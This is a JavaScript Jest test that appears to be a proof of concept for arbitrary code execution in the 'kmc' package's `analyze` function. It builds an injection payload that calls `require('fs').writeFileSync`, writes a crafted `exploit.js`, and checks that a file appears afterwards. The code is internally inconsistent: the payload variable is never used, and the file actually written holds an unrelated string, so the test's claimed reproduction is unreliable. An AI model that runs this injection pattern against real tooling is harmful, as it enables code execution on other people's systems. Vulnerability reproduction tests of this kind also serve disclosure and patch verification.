test("Arbitrary code execution in kmc", () => {
  expect.assertions(2);
  const fs = require("fs");
  let kmc = require("kmc/lib");
  const path = "./kmc";
  let payload = "red(); require('fs').writeFileSync('" + path + "',``); //";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  fs.writeFileSync(
    "./exploit.js",
    "//{requires:[throw new Error()]});"
  );
  try {
    kmc.analyze("./exploit.js");
  } catch (e) {
    console.log("Start Error")
    console.log(e)
    console.log("End Error")
  }
  fs.unlinkSync("./exploit.js");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
